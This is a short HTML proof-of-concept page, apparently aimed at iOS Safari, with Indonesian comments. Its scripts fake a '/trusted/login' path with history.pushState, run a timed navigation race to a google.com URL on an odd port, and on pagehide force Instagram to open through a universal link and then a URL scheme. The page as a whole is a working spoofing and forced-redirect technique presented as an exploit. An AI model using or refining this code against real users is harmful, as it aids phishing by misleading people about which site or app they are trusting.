<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>iOS PoC Open Instagram</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
</head>

<body>
<center>
  <button id="start">Start</button>
  <div id="panel" style="display:none">Loading…</div>
</center>

<script>
/* Step 1: Fake trusted path */
document.getElementById('start').onclick = () => {
  history.pushState({}, '', '/trusted/login');
  panel.style.display = 'block';
};

/* Step 2: Navigation race (TARGET DI AKHIR) */
window.addEventListener('pageshow', () => {
  requestAnimationFrame(() => {
    requestAnimationFrame(() => {
      setTimeout(() => {
        location.href = 'https://google.com:9090/#https://google.com:9090';
      }, 80);
    });
  });
});
</script>

<!-- TAMBAHAN TANPA MENYENTUH SNIPPET -->
<script>
/* Step 3: iOS app open (Instagram) */
window.addEventListener('pagehide', () => {
    // Universal Link
    setTimeout(() => {
        location.href = 'https://www.instagram.com/instagram/';
    }, 50);

    // Scheme fallback
    setTimeout(() => {
        location.href = 'instagram://user?username=instagram';
    }, 120);
});
</script>

</body>
</html>
